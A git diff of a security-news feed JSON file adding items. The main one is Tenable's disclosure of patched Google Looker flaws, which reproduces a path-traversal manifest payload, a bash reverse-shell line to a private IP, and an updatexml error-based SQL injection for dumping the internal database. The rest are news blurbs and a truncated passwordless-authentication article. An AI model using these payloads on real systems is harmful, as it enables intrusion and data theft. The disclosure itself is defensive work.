@@ -1,7 +1,7 @@
 {
-  "generated_at": "2026-02-04T10:13:01.570745+00:00",
+  "generated_at": "2026-02-04T11:07:43.451490+00:00",
   "days_back": 30,
-  "total_items": 8668,
+  "total_items": 8679,
   "items": [
     {
       "title": "Secure Your Spot at RSAC 2026 Conference",
@@ -16,6 +16,136 @@
       "curated": false
     },
     {
+      "title": "LookOut: Discovering RCE and Internal Access on Looker (Google Cloud & On-Prem)",
+      "summary": "Tenable Research discovered two novel vulnerabilities in Google Looker that could allow an attacker to completely compromise a Looker instance. Google moved swiftly to patch these issues. Organizations running Looker on-prem should verify they have upgraded to the patched versions. Key takeaways Two novel vulnerabilities: Tenable Research discovered a remote code execution (RCE) chain via Git hook overrides that could lead to cross-tenant access, and an internal database exfiltration flaw via internal connection abuse ( CVE-2025-12743 ) that could lead to the exposure of sensitive data. We have collectively dubbed both vulnerabilities as \u201cLookOut.\u201d Cross-tenant breach potential: The RCE vulnerability bypassed cloud isolation in Google-hosted environments, creating a pathway for attackers to potentially \"hop\" between different customer environments and access private data. Unpatched on-premises risk: While Google patched the vulnerabilities on its managed Looker in Google Cloud, organizations running customer-hosted or on-premises versions remain critically exposed until they apply the necessary security patches. Google Looker stands out as a powerful business intelligence platform. It allows organizations to define data relationships using LookML, a Google proprietary modeling language, and visualize that data in real-time. Because Looker is often the central nervous system for an organization's most sensitive data, the security of its underlying architecture is crucial. Looker operates under two primary deployment models: A SaaS version of Looker, where the instance is fully managed by Google Cloud; and customer-hosted version, where the organization deploys the Looker JAR file on its own infrastructure (on-premises or private cloud). This distinction is critical to the impact of our findings: while SaaS environments rely on the provider\u2019s security controls, customer-hosted instances place the full burden of infrastructure security and patching on the organization using Looker. A different, but similarly-named product -- Looker Studio -- isn't impacted by our vulnerability findings. LookOut could allow an attacker to completely compromise a Looker instance: A remote code execution (RCE) chain that grants an attacker the ability to run arbitrary code on the Looker server. In practical terms, this provides full administrative access to the underlying infrastructure, allowing an attacker to steal sensitive secrets, manipulate data, or pivot further into the internal network. In cloud instances, the vulnerability could potentially lead to cross-tenant access. An authorization bypass that allowed attackers to attach to Looker\u2019s internal database connections and exfiltrate the full internal MySQL database via error-based SQL injection. These issues were reported to Google via the Cloud Vulnerability Reward Program (VRP) and fixed promptly. We want to thank Google\u2019s Cloud VRP for the support, collaboration, and professionalism. Organizations using customer-hosed and on-prem versions of Looker are advised to deploy available patches as soon as possible and read the following security bulletin . Vulnerability #1: RCE via Git hooks config override and path traversal The first vulnerability exploits how Looker handles remote dependencies in LookML projects, leading to arbitrary code execution. An attacker could create a malicious LookML project to run code on Looker\u2019s server. The exploit chain We reviewed Looker\u2019s source code and achieved a full RCE, by chaining the following primitives together: Arbitrary directory creation Path traversal in multiple inputs Race condition This effectively gave us control over the Looker instance, potentially allowing us to access secrets and cross-tenant data. Background The target: LookML project manifests and Git hooks Looker allows developers to define \"remote dependencies\" in a file called manifest.lkml . This feature lets you import LookML views and models from other Git repositories. A standard dependency looks like this: LookML remote_dependency: public_project { url: \"https://github.com/llooker/google_ga360\" ref: \"07a20007b6876d349ccbcacccdc400f668fd8147f1\" } LookML project example When you save this, Looker clones that repository into: /home/looker/looker/remote_dependencies/ /. Crucially, every Looker project is a Git repository. Looker uses Git hooks and hardcodes the Git hooksPath in the .git/config file to a safe location: ../../git_hooks/ . The spark We knew that every LookML project is, at its core, a Git repository. That means somewhere on the file system, there is a .git folder governing its behavior. We navigated to one of the project directories on our testing instance, specifically models-user-looker, and opened the repository-specific configuration file: .git/config . Here is what we saw: Our eyes immediately locked onto the last line: hooksPath . For those unfamiliar with Git internals, hooksPath is a configuration variable that tells Git, \"Don't look for hook scripts in the default .git/hooks folder. Look here instead.\" Git hooks are powerful. They are scripts (bash, python, etc.) that execute automatically when certain events happen, like a commit or a push. Looker, seemingly aware of this danger, had hardcoded this value to point to ../../git_hooks/ , a directory outside the project root that is supposed to be read-only and managed by the system. But then we looked more closely at the path structure. The value was: ../../git_hooks/my_remote_project_name . We asked ourselves: Where does that project name string come from? It comes from the manifest.lkml file we define as a user: remote_dependency: my_remote_project_name { ... } That string isn't generated by the system; it\u2019s input we control. And it\u2019s being concatenated directly into a file path string in the config. Our gears started turning immediately. If Looker is just taking our string and pasting it into that config file, what prevents us from using standard directory traversal characters? If we named our project ../../../../tmp/pwned , would the config result in hooksPath = ../../git_hooks/../../../../tmp/pwned ? If that hypothesis held true, we effectively had a \"Git hook configuration override\" primitive. We could point the hooks path away from Looker\u2019s folder and point it to any directory on the server where we could write files. And if we can tell Git to run scripts from a folder we control, we can execute arbitrary code. This was the starting point. Ingredient 1: The config path traversal (the setup) Our first thought was simple: Can we break out of the folder structure using the dependency name? We crafted a manifest where the dependency name contained traversal characters: remote_dependency: ../../../../../../my_custom_hooks_folder { url: \"https://github.com/llooker/google_ga360\" ... } The remote dependency name is used as the value injected into the hooksPath value, while the ref points to the Git repository whose .git folder will be overridden with this injected value. The repository we chose to override is the one where Git operations are executed when using the LookML project regularly, allowing us to trigger the hooks. It worked. Looker accepted the name and wrote it directly into the .git/config hooksPath . Instead of pointing to the safe folder, the config now pointed to: ../../git_hooks/../../../../../../my_custom_hooks_folder The issue? The config path traversal did not really work. Our malicious custom hooks did not run. Ingredient 2: The directory creation (the roadblock) We had a path traversal, but we hit a wall. For the traversal to work, the base directory ( git_hooks ) had to exist. We were not sure why, but in the environment we were attacking, this folder wasn't there. The file system would reject the path if one of the directories defined in the traversal didn't exist. We then thought we could try to find a primitive to create an arbitrary directory. We realized the remote_dependency logic does more than just write configs; it performs git clones. By manipulating the ref (the branch or commit hash) and the name of another dependency, we could trick the system. We created a dummy dependency: remote_dependency: git_hooks_creator { url: \"https://github.com/llooker/google_ga360\" ref: \"../../git_hooks\" } This payload forced the system to try and clone data into a path named ../../git_hooks . As a side effect of this operation, the system created the git_hooks directory to satisfy the request. Now the path existed. The traversal was valid. Ingredient 3: The weaponized pepo (the payload) We had a way to redirect the hooksPath (Ingredient 1), and a way to ensure the directory existed (Ingredient 2). Now the critical question: What do we put inside that directory? Pointing the configuration to a folder is useless if that folder is empty or contains non-executable files. For Git to execute a hook (like pre-commit or post-commit ), two conditions must be met: The file must exist with the correct name (e.g., pre-commit ). The file must have the executable permission bit set ( +x ). This created a challenge. Typically, when you clone a repository, Git doesn't automatically trust or preserve the file permissions from your local machine blindly -- with one major exception. Git does record the executable bit (100755) in its internal tree objects if it\u2019s explicitly told to do so. If we just created a script on our machine, ran chmod +x script.sh , and pushed it, the executable bit might be preserved depending on the client\u2019s OS and configuration. We wanted a guarantee. We needed to manipulate the Git index directly to ensure that any client cloning this repo (including the Looker server) would be forced to write that file to disk as an executable. We used the following Git command on our attacker machine: git update-index --chmod=+x hook Why this Git command matters: Standard chmod changes the file system metadata on your computer. git update-index changes the metadata in the Git index itself. It tells Git: \"I don't care what the file system says; when you store this file in the repo object, mark it as an executable binary.\" So, the attack setup looked like this: We created a malicious repository hosted on GitHub. Inside, we placed a bash script named pre-commit containing our reverse shell payload. We forced the executable bit in the Git index. We pushed this \"weaponized repo\" to the web. Now, when Looker cloned this \"innocent\" remote dependency (using the directory creation primitive from Ingredient 2), it dutifully followed the instructions in the Git tree object. It wrote our pre-commit script to the disk and set the executable bit . Because of our config path traversal (Ingredient 1), Looker\u2019s config was now pointing the hooksPath to the exact folder where this cloned, executable, and malicious script was waiting. The trap was set. The payload script: #!/bin/bash /bin/bash -i >& /dev/tcp/10.0.0.1/1337 0>&1 Ingredient 4: Git hooks won\u2019t run We had the config pointed at our script. We had the script in place. But for some reason, the hooks did not run when we tried to run the exploit. We found out that the problem was JGit . By default, Looker uses JGit (a Java implementation of Git) for all repository operations. JGit doesn't support Git hooks, therefore, it does not run scripts from hooksPath the way native Git does. However, we knew there should be a Git implementation in the code base so we kept reviewing Looker\u2019s code. We found a specific deployment flow that allows deploying a Looker project with an attached Git repository, where Looker executes real Git commands instead of JGit. Looker then falls back to executing real system Git commands. Moshe Bernstein , Tenable Senior Security Researcher, played a pivotal role here. He helped hunt down this specific needle in the haystack. He found the exact parameters that needed to be set by following the code execution flow from sending the project creation request to the endpoint to creating a Git repository inside Looker that works with Git and not JGit. By sending a specific set of POST parameters, we could create a repository that works with Git in the code flow, and not with JGit. These specifically were the POST parameters to create a Looker Git repository that works with Git commands when interacted with: git_auth_configured=true&git_application_server_http_scheme=&git_application_server_http_port=&skip_tests=true&reset_deploy_key=false Ingredient 5: The race condition (the trigger) There was another problem: before running a Git command, Looker overwrites the .git/config as part of the code flow. This leads to the hooksPath value being reset and changed to the default and safe value. It cleans up our mess before we can exploit it. To tackle the problem, this is where the race condition comes in: Looker starts the operation. Looker writes the Safe config. Looker executes git commit . We needed to inject step 2.5: Overwrite the config with our malicious path. Because the file system write (the config update) and the execution (the commit) are distinct events, we could hammer the API. We set up a script to spam the \"save manifest\" endpoint (which writes our malicious traversal to the config) while simultaneously triggering the \"commit\" endpoint. After a few tries, we won the race. The system executed git commit, checked the config (which we had just overwritten), followed the hooksPath to our malicious directory, and executed our script. As an example, we dropped a txt file inside the /tmp directory: Result: RCE on the Looker instance For Looker\u2019s Google-managed instances in Google Cloud Platform (GCP), the RCE could affect cross-tenant victims. By accessing a shared secrets folder, attackers could laterally move to other GCP customers. For on-premises and self-hosted versions, the threat shifts from cross-tenant access to code execution, leading to internal lateral movement. Vulnerability #2: Full internal database exfiltration The second vulnerability allowed us to peer behind the curtain of Looker's internal management. Internal connections While poking inside Looker\u2019s logs, we found out that Looker manages its own metadata, users, and permissions using an internal MySQL database with internal database connections. Each Looker project has a Looker instance with its own MySQL internal database. Access to these internal connections is strictly restricted and should not be accessible to standard users or developers. Yet, one of the logs leaked the internal Looker database connection, named looker__ilooker . Proxying to internal connections When creating a new LookML project, customers should select a connection to their own database to use their data inside the created project. The UI restricts users from selecting database connections that they don\u2019t own and only lists the database connections that they created and are available to them. Armed with the knowledge that internal connections and internal databases are used to manage Looker instances, we were able to intercept the HTTP request and modify the connection parameter directly. We could then bypass the UI validation and attach to an internal connection. We simply proxied the request and changed the connection name to looker__ilooker . Looker accepted the request, attaching our user-controlled project to its highly sensitive internal database. Exfiltrating data with error-based SQL injection With the project attached to the internal database, we still needed a way to extract data. We turned to Looker's \"data tests\" feature. In LookML tests, the \u201csql\u201d field lets you run a custom SQL query directly against the attached database connection to validate data conditions. Luckily for us, in the project we just created, the attached database connection is the internal Looker database we attached. Even though LookML data tests allow a sql field, Looker still controls how that SQL is executed. The SQL is expected to be a Boolean-style validation query, results are not fully returned to the user, and you typically only see pass/fail, not raw query output. So while the SQL runs, its output isn\u2019t exposed in a way that lets you read any meaningful data. We came up with the idea of creating a LookML test that included an error-based SQL injection payload inside a dimension definition, to leak data with errors: LookML dimension: id { type: number sql: updatexml(null, concat(0x7e, IFNULL((SELECT name FROM project_state LIMIT 1 OFFSET 0), 'NULL'), 0x7e, '///'), null) ;; } When we ran the data test, the underlying database attempted to execute this SQL. Because of the updatexml function, the database threw an error that contained the result of our subquery. The result: XPATH syntax error: '~dev::uri:classloader:/helltool/' By iterating through offsets, we could dump the entire internal database - users, configurations, and secrets - byte by byte. After confirming that we could have leaked data with the vulnerability, we did not escalate further. Conclusion and next steps These two vulnerabilities demonstrate that even mature, widely used platforms can harbor significant security risks. The \"LookOut\" vulnerabilities serve as a reminder that Business Intelligence (BI) platforms are high-value targets. The discovery of a cross-tenant RCE path underscores the complexity of securing cloud environments. It\u2019s hard to secure systems while giving users highly powerful capabilities, such as running SQL and indirectly interacting with the file system of the managing instance. The bottom line: While Google has moved swiftly to patch these issues, the burden of security now shifts to customer-hosted administrators. Organizations running Looker on-premises must verify they have upgraded to the patched versions. If your Looker instance is self-hosted, we recommend upgrading your Looker instances to one of the following versions: 25.12.30+ 25.10.54+ 25.6.79+ 25.0.89+ 24.18.209+ Note: releases 25.14 and above are not affected by these security issues. Tenable Research has disclosed all of these issues to Google and directly worked with them to fix the vulnerabilities. The Google security bulletin can be seen here . The associated TRAs are TRA-2025-44 and TRA-2025-43 . To get more information about how to protect your cloud environments, visit the Tenable Cloud Security page.",
+      "link": "https://www.tenable.com/blog/google-looker-vulnerabilities-rce-internal-access-lookout",
+      "source": "Tenable Blog",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2026-02-04T11:00:00+00:00",
+      "published_ts": 1770202800,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC",
+        "Cloud / SaaS",
+        "Malware / Payloads",
+        "Web / API Security",
+        "Identity / Access",
+        "Data Breaches / Leaks",
+        "Crypto / Web3"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Whale's $9B Bitcoin sale was not due to quantum concerns: Galaxy Digital",
+      "summary": "Company pushes back after reports suggest a $9B Bitcoin sale by a wealthy client was tied to quantum computing fears.",
+      "link": "https://cointelegraph.com/news/whale-9b-bitcoin-sale-not-quantum-concerns-galaxy-digital?utm_source=rss_feed&utm_medium=rss&utm_campaign=rss_partner_inbound",
+      "source": "Cointelegraph.com News",
+      "type": "crypto",
+      "type_label": "Crypto & Blockchain Security",
+      "published": "2026-02-04T10:35:35+00:00",
+      "published_ts": 1770201335,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "One Identity Appoints Gihan Munasinghe as Chief Technology Officer",
+      "summary": "Alisa Viejo, United States, February 4th, 2026, CyberNewsWire One Identity, a leader in unified identity security, today announced the appointment of Gihan Munasinghe as Chief Technology Officer. Munasinghe brings more than 15 years of experience leading global engineering organizations and delivering large-scale, customer-centric software platforms. In this role, he will lead the engineering organization and set [\u2026] The post One Identity Appoints Gihan Munasinghe as Chief Technology Officer appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/one-identity-appoints-gihan-munasinghe-as-chief-technology-officer/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:35:07+00:00",
+      "published_ts": 1770201307,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "One Identity Appoints Gihan Munasinghe as Chief Technology Officer",
+      "summary": "Alisa Viejo, United States, February 4th, 2026, CyberNewsWire One Identity, a leader in unified identity security, today announced the appointment of Gihan Munasinghe as Chief Technology Officer. Munasinghe brings more than 15 years of experience leading global engineering organizations and delivering large-scale, customer-centric software platforms. In this role, he will lead the engineering organization and set [\u2026] The post One Identity Appoints Gihan Munasinghe as Chief Technology Officer appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform .",
+      "link": "https://gbhackers.com/one-identity-appoints-gihan-munasinghe-as-chief-technology-officer/",
+      "source": "GBHackers News",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:33:46+00:00",
+      "published_ts": 1770201226,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "Exposed AWS Credentials Lead to AI-Assisted Cloud Breach in 8 Minutes",
+      "summary": "Researchers recently tracked a high-speed cloud attack where an intruder gained full admin access in just eight minutes. Discover how AI automation and a simple storage error led to a major security breach.",
+      "link": "https://hackread.com/8-minute-takeover-ai-hijack-cloud-access/",
+      "source": "HackRead",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:31:10+00:00",
+      "published_ts": 1770201070,
+      "smart_groups": [
+        "Cloud / SaaS"
+      ],
+      "curated": false
+    },
+    {
+      "title": "Supply Chain Attack Exploits Notepad++ Update Mechanism to Push Targeted Malware",
+      "summary": "Notepad++, a widely used text editor among developers, became the target of a sophisticated supply chain attack that compromised its update infrastructure for nearly 6 months. On February 2, 2026, the developers published a statement revealing that attackers gained control of the update mechanism due to a hosting provider-level incident occurring from June to September [\u2026] The post Supply Chain Attack Exploits Notepad++ Update Mechanism to Push Targeted Malware appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform .",
+      "link": "https://gbhackers.com/notepad-update/",
+      "source": "GBHackers News",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:20:48+00:00",
+      "published_ts": 1770200448,
+      "smart_groups": [
+        "Curated",
+        "Exploit / PoC",
+        "Malware / Payloads"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Hackerangriff auf Romina Mineralbrunnen",
+      "summary": "srcset=\"https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?quality=50&strip=all 2048w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=300%2C168&quality=50&strip=all 300w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=768%2C432&quality=50&strip=all 768w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=1024%2C576&quality=50&strip=all 1024w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=1536%2C864&quality=50&strip=all 1536w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=1240%2C697&quality=50&strip=all 1240w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=150%2C84&quality=50&strip=all 150w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=854%2C480&quality=50&strip=all 854w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=640%2C360&quality=50&strip=all 640w, https://b2b-contenthub.com/wp-content/uploads/2026/02/467510068_122131307660493869_19679345767413254_n.jpg?resize=444%2C250&quality=50&strip=all 444w\" width=\"1024\" height=\"576\" sizes=\"auto, (max-width: 1024px) 100vw, 1024px\"> Romina ist bekannt f\u00fcr seine Mineralwasser-Marken Eiszeitquell und Silberbrunnen. Eine Cyberattacke sorgt aktuell f\u00fcr einen Stillstand der Produktionsanlagen. Romina Mineralbrunnen GmbH Der Getr\u00e4nke-Abf\u00fcller Romina mit Sitz in Reutlingen-Rommelsbach wurde k\u00fcrzlich von einer Cyberattacke getroffen. Wie das Unternehmen auf seiner Website erkl\u00e4rt, sei man deshalb weder telefonisch noch per E-Mail erreichbar. Laut einem Bericht des Reutlinger General-Anzeiger steht auch die Produktion aktuell still. Weitere Details zu dem Vorfall gibt es bisher nicht. Daher ist unklar, wie der Angriff genau abgelaufen ist. Ebenfalls ist nicht bekannt, ob Daten gestohlen wurden. Der Regionalzeitung S\u00fcdwest Presse zufolge ermittelt die Polizei Reutlingen bereits in dem Fall. Romina Mineralbrunnen besch\u00e4ftigt nach eigenen Angaben 130 Mitarbeiterinnen und Mitarbeiter. 2024 hatte das Unternehmen 180,7 Millionen F\u00fcllungen verzeichnet und einen Umsatz von mehr als 40 Millionen Euro erwirtschaftet.",
+      "link": "https://www.csoonline.com/article/4127094/hackerangriff-auf-romina-mineralbrunnen.html",
+      "source": "CSO Online",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:19:25+00:00",
+      "published_ts": 1770200365,
+      "smart_groups": [],
+      "curated": false
+    },
+    {
+      "title": "SolarWinds Web Help Desk Vulnerability Actively Exploited",
+      "summary": "CISA has added a critical CVE in SolarWinds Web Help Desk to its KEV Catalog",
+      "link": "https://www.infosecurity-magazine.com/news/solarwinds-web-help-desk/",
+      "source": "Infosecurity Magazine \u2013 News",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:15:00+00:00",
+      "published_ts": 1770200100,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Hackers Exfiltrating NTDS.dit File to Gain Full Active Directory Access",
+      "summary": "Active Directory remains the backbone of enterprise authentication systems, storing critical information about user accounts, passwords, and domain configurations. Recently, security experts have observed a surge in attacks targeting the NTDS.dit database file, which contains encrypted password hashes for every domain account. When attackers successfully steal this file, they gain the ability to crack passwords [\u2026] The post Hackers Exfiltrating NTDS.dit File to Gain Full Active Directory Access appeared first on Cyber Security News .",
+      "link": "https://cybersecuritynews.com/hackers-exfiltrating-ntds-dit-file/",
+      "source": "Cyber Security News (FeedBurner)",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:05:50+00:00",
+      "published_ts": 1770199550,
+      "smart_groups": [
+        "Windows / Microsoft"
+      ],
+      "curated": false
+    },
+    {
       "title": "31 Complaints Busted a \u20b920-Crore Online Trading Scam: Shamli\u2019s 2 \u2018Natwar Lals\u2019 Arrested",
       "summary": "\u201cAnother trading scam got busted after a total of 31 complaints of around \u20b920 crore... The post 31 Complaints Busted a \u20b920-Crore Online Trading Scam: Shamli\u2019s 2 \u2018Natwar Lals\u2019 Arrested appeared first on .",
       "link": "https://www.news4hackers.com/31-complaints-busted-a-20-crore-online-trading-scam-shamlis-2-natwar-lals-arrested/",
@@ -26,6 +156,22 @@
       "published_ts": 1770199436,
       "smart_groups": [],
       "curated": false
+    },
+    {
+      "title": "CISA Warns of Exploited GitLab Community and Enterprise SSRF Vulnerability",
+      "summary": "The Cybersecurity and Infrastructure Security Agency (CISA) has added a critical server-side request forgery (SSRF) vulnerability affecting GitLab Community and Enterprise Editions to its Known Exploited Vulnerabilities (KEV) catalog. The flaw, tracked as CVE-2021-39935, is now confirmed to be under active exploitation in the wild. Vulnerability Details The SSRF vulnerability in GitLab\u2019s CI Lint API [\u2026] The post CISA Warns of Exploited GitLab Community and Enterprise SSRF Vulnerability appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform .",
+      "link": "https://gbhackers.com/cisa-warns-of-exploited-gitlab-community/",
+      "source": "GBHackers News",
+      "type": "general",
+      "type_label": "General Security & Blogs",
+      "published": "2026-02-04T10:02:17+00:00",
+      "published_ts": 1770199337,
+      "smart_groups": [
+        "Curated",
+        "Vulnerabilities / CVEs",
+        "Exploit / PoC"
+      ],
+      "curated": true
     },
     {
       "title": "Microsoft and ServiceNow's exploitable agents reveal a growing - and preventable - AI security crisis",
@@ -69,6 +215,55 @@
       "smart_groups": [
         "Curated",
         "Exploit / PoC"
+      ],
+      "curated": true
+    },
+    {
+      "title": "Zero trust in practice: A deep technical dive into going fully passwordless in hybrid enterprise environments",
+      "summary": "Over the past three years, I\u2019ve led passwordless migration initiatives at three Fortune 500 companies, and I can tell you with confidence that eliminating passwords from a hybrid Active Directory and Microsoft Entra ID environment is one of the most rewarding \u2014 and most underestimated \u2014 technical challenges in modern identity management. The theoretical appeal is obvious: no passwords means no credential compromise, phishing becomes exponentially harder and your security posture fundamentally shifts from \u201cprevent breaches\u201d to \u201cassume breach.\u201d But the reality of implementation in environments spanning on-premises and cloud infrastructure? That\u2019s where the genuine complexity lives. Most organizations I\u2019ve worked with start this journey with romantic notions of flipping a switch and sailing into a passwordless future. What they discover instead is that achieving true passwordless authentication requires rethinking identity architecture from the ground up. It\u2019s not about swapping one authentication method for another \u2014 it\u2019s about fundamentally restructuring how you verify identity across every layer of your infrastructure. The transition demands careful planning, technical rigor and unwavering commitment to security principles over convenience. Prerequisites: Building the foundation before the migration Before we can talk about passwordless authentication, we need to address what I call the \u201cprerequisite triangle\u201d: cloud Kerberos trust, device registration and Conditional Access policies. Skip any one of these, and your migration will stall before it gains momentum. Cloud Kerberos trust is the unsung hero of hybrid passwordless deployments. When I started working on my first full migration, I underestimated how critical this piece was. Traditional Kerberos assumes a managed network with domain controllers you control. Cloud Kerberos allows your cloud-based services to issue Kerberos tickets to hybrid-joined devices without requiring a domain controller on the internet. This is your bridge between on-premises and cloud identity, and it\u2019s non-negotiable for seamless hybrid authentication. The mechanics of Kerberos itself haven\u2019t changed significantly since its introduction in the 1980s, but extending it to cloud environments required a fundamental rethinking of how authentication tickets are issued and validated across trust boundaries. Getting cloud Kerberos working requires Azure AD Connect to run version 2.0 or later with the cloud sync agent configured for password hash synchronization (even if you\u2019re not using it for authentication \u2014 this remains a prerequisite). Your hybrid-joined devices need to be running Windows 10 20H2 or later, and they must have reliable network connectivity to both your on-premises domain controllers and Azure. In one deployment, my team spent two weeks troubleshooting authentication failures before discovering that a firewall rule was blocking the necessary communication on port 88. This single finding reinforced why network validation should occur before pilot rollout, not during. Device registration and management come next. Every device attempting passwordless authentication must be either Azure AD joined, hybrid AD joined or registered with Entra ID. I\u2019ve found that hybrid-joined devices work best in truly hybrid environments because they maintain connection to on-premises infrastructure while gaining cloud identity benefits. Your Intune Mobile Device Management deployment becomes critical here \u2014 devices must be compliant with your policies before they\u2019re trusted for passwordless sign-in. This means ensuring that disk encryption is enabled, that antivirus is running and that devices meet your organization\u2019s baseline security posture. The compliance baseline isn\u2019t punitive; it\u2019s the minimum acceptable security threshold. Conditional Access policies form the final leg of the prerequisite triangle. These aren\u2019t optional \u2014 they\u2019re how you enforce the \u201ctrust zero, verify always\u201d principle of Zero Trust. The National Institute of Standards and Technology defines Zero Trust architecture as requiring continuous verification and explicit access grants based on all available data points. I configure policies that require device compliance, enforce multi-factor authentication for sensitive operations, and block legacy authentication entirely. The policy I typically recommend as a starting point requires hybrid-joined devices, compliant Intune status and MFA for all access to on-premises resources, while allowing seamless sign-in for fully compliant devices. This creates a virtuous cycle where security and user experience reinforce each other. Architecture decisions: Hybrid authentication flows and Windows Hello for Business Once your prerequisites are in place, you face critical architectural decisions that will shape your deployment for years to come. The primary decision point is whether to use Windows Hello for Business, FIDO2 security keys or phone sign-in as your primary authentication mechanism. In my experience, Windows Hello for Business is the foundation for hybrid environments. It leverages biometric or PIN authentication on the device itself, preventing credentials from ever being transmitted across the network. When a user signs in with Windows Hello, they\u2019re not sending a password or even a credential \u2014 they\u2019re using a private key stored in the device\u2019s Trusted Platform Module (TPM) to prove their identity. For hybrid-joined devices, this works seamlessly because the device can authenticate both to your on-premises domain controller (using cloud Kerberos) and to Entra ID in a single operation. This eliminates the attack surface that traditional password-based authentication creates. Organizations seeking more information on passwordless authentication approaches can review guidance from the Cybersecurity and Infrastructure Security Agency , which has published extensive recommendations on moving beyond passwords. However \u2014 and this is crucial \u2014 not all devices have TPM 2.0, which is required for the most secure implementations. In one organization where we deployed to 15,000 devices, we discovered that 12% didn\u2019t meet hardware requirements. We ended up implementing a phased approach: Windows Hello for Business on compliant devices, with FIDO2 security keys as the backup for devices that couldn\u2019t support it. FIDO2 keys, which conform to the open FIDO2 standard , are also your answer for scenarios where you need physical authentication tokens \u2014 particularly useful for privileged accounts or high-risk scenarios. They\u2019re resistant to phishing and account takeover because possession of the physical token is required. Research from the Identity Defined Security Alliance has shown that organizations using FIDO2-compliant authenticators reduce account compromise incidents by over 90% compared to password-dependent systems. The architectural decision also includes determining how you handle legacy applications that still require passwords. Your options are limited: implement a passwordless-compatible application gateway, deprecate the application entirely or use Entra ID\u2019s smart lockout and password protection features to reduce risk while you transition. I typically recommend treating legacy application support as a temporary bridge, not a permanent architecture. Organizations that treat this as permanent inevitably find themselves maintaining password infrastructure indefinitely, undermining the entire security posture you\u2019re building. Migration workflows: The step-by-step reality The migration itself needs to follow a structured approach that I\u2019ve refined across multiple organizations. Start with a pilot group \u2014 I recommend between 50 and 200 users who are willing to accept some friction in exchange for security improvements. This group should include IT staff and security-conscious users who can provide meaningful feedback without becoming frustrated with early-stage issues. For the pilot phase, configure Windows Hello for Business using Group Policy on your on-premises infrastructure for domain-joined devices, while using Intune policies for cloud-managed devices. Configure Entra ID to require Windows Hello as the preferred authentication method. During this phase, maintain traditional password authentication as a fallback \u2014 not because you lack confidence, but because user trust in the system matters. I typically see a three to four week period where you\u2019re supporting both methods while users adapt. This period provides invaluable data about real-world usage patterns and edge cases. The second phase involves expanding to department-level groups. At this point, you should have identified and documented all the troubleshooting patterns that emerged in your pilot. Common issues I\u2019ve encountered include PIN complexity policies that conflict with Windows Hello configuration, credential caching issues on hybrid-joined devices and confusion around how to recover access when a device is lost or compromised. A well-designed help desk knowledge base at this stage prevents the third phase from becoming a support crisis. The final phase is organization-wide rollout with password authentication disabled. This is where you must have complete confidence in your fallback mechanisms and your support team\u2019s ability to handle edge cases. I recommend maintaining password authentication for break-glass scenarios (though heavily restricted and logged) for at least 90 days after full rollout. This safety net provides psychological comfort to leadership and creates a genuine escape hatch if something unexpected occurs at scale. Troubleshooting patterns and lessons learned After guiding three large-scale deployments, I\u2019ve compiled a list of issues that deserve attention before they become production problems rather than documented solutions. Device compliance checking often becomes a bottleneck. If your Intune policies are too strict, you\u2019ll have users locked out of passwordless authentication because their devices are non-compliant. The solution isn\u2019t to loosen policies \u2014 it\u2019s to automate compliance remediation. Use Intune\u2019s remediation scripts to automatically enable required features and update settings rather than blocking access. When a device becomes non-compliant due to a missing security update, remediation scripts can deploy that update silently, restoring access without support interaction. Cloud Kerberos ticket refresh failures occur when devices lose network connectivity. I\u2019ve found that users appreciate understanding that brief network outages might require them to use an alternative authentication method temporarily. Documenting this expectation and providing clear error messages reduces support burden significantly. One organization I worked with created a simple status dashboard showing cloud connectivity health, which dramatically improved user confidence in the system. The Windows Hello PIN reset flow needs careful planning. Users will forget PINs \u2014 not because they\u2019re careless, but because they now have one less password to remember and are redirecting that cognitive effort elsewhere. Implement Entra ID\u2019s self-service PIN reset capability, but test it thoroughly in various network conditions. I discovered in one deployment that users couldn\u2019t reset their PIN while offline, which created support tickets even though the feature was technically available online. A simple offline reset option would have eliminated those tickets. Recovery mechanisms deserve special attention. What happens when a user\u2019s device is stolen? What if the TPM fails? What if they forget their PIN and can\u2019t reach your self-service portal? Document these scenarios and test them with your help desk before full rollout. I\u2019ve found that help desk confidence in recovery procedures directly correlates with user confidence in passwordless authentication. The endpoint: A genuinely passwordless 